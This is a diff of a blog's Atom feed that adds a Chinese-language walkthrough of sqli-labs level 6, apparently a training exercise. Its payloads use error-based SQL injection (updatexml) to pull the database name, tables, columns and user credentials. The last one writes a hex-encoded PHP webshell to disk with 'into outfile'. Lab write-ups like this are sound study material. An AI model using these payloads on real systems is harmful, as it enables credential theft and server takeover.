@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-12-24T05:25:04.045Z</updated>
+  <updated>2022-12-24T05:57:08.890Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqli-labs-6</title>
+    <link href="http://example.com/2022/12/24/sqli-labs-6/"/>
+    <id>http://example.com/2022/12/24/sqli-labs-6/</id>
+    <published>2022-12-24T05:29:37.000Z</published>
+    <updated>2022-12-24T05:57:08.890Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="sqli-labs-6"><a href="#sqli-labs-6" class="headerlink" title="sqli-labs-6"></a>sqli-labs-6</h1><span id="more"></span><h2 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h2><p>输入正确的id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1</span><br></pre></td></tr></table></figure><p>页面显示：</p><blockquote><p>You are in………..</p></blockquote><p>说明本关不回显<br>添加’,”后发现”输入后页面显示报错</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1</p></blockquote><p>说明需要闭合的是双引号</p><h2 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h2><p>使用报错注入得到数据库名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),3) --+</span><br></pre></td></tr></table></figure><p>页面显示：</p><blockquote><p>XPATH syntax error: ‘<del>security</del>‘</p></blockquote><p>从而得知数据库名称为<strong>security</strong></p><h2 id="获取所有表名"><a href="#获取所有表名" class="headerlink" title="获取所有表名"></a>获取所有表名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure><p>页面显示：</p><blockquote><p>XPATH syntax error: ‘<del>emails,referers,uagents,users</del>‘</p></blockquote><p>得到所有的表名为<strong>emails,referers,uagents,users</strong></p><h2 id="获取users表中的所有列名"><a href="#获取users表中的所有列名" class="headerlink" title="获取users表中的所有列名"></a>获取users表中的所有列名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;users&#x27; and table_schema = &#x27;security&#x27;),1,31),0x7e),3) --+</span><br></pre></td></tr></table></figure><p>页面显示：</p><blockquote><p>XPATH syntax error: ‘<del>id,username,password</del>‘</p></blockquote><p>得到users表中的所有列名为<strong>id,username,password</strong></p><h2 id="获取users表中的所有username和password"><a href="#获取users表中的所有username和password" class="headerlink" title="获取users表中的所有username和password"></a>获取users表中的所有username和password</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; and updatexml(1,concat(0x7e,(select (concat(username,&#x27;^&#x27;,password)) from users limit 0,1),0x7e),3) --+</span><br></pre></td></tr></table></figure><p>页面显示：</p><blockquote><p>XPATH syntax error: ‘<del>Dumb^Dumb</del>‘</p></blockquote><p>改变limit后面的数字limit 1,1、limit 2,1 。。。<br>获取所有的username和password</p><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?id=1&quot; into outfile &#x27;C:/less6.php&#x27; lines terminated by 0x3c3f7068702061737365727428245f504f53543d5b4c657373365d293b203f3e --+</span><br></pre></td></tr></table></figure><p>可以在相关路径找到对应php文件，0x开头的十六进制符号可以用16进制转字符翻译</p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;sqli-labs-6&quot;&gt;&lt;a href=&quot;#sqli-labs-6&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs-6&quot;&gt;&lt;/a&gt;sqli-labs-6&lt;/h1&gt;</summary>
+    
+    
+    
+    <category term="sqli-labs" scheme="http://example.com/categories/sqli-labs/"/>
+    
+    
+    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
+    
+  </entry>
   
   <entry>
     <title>php学习2022-12-24</title>
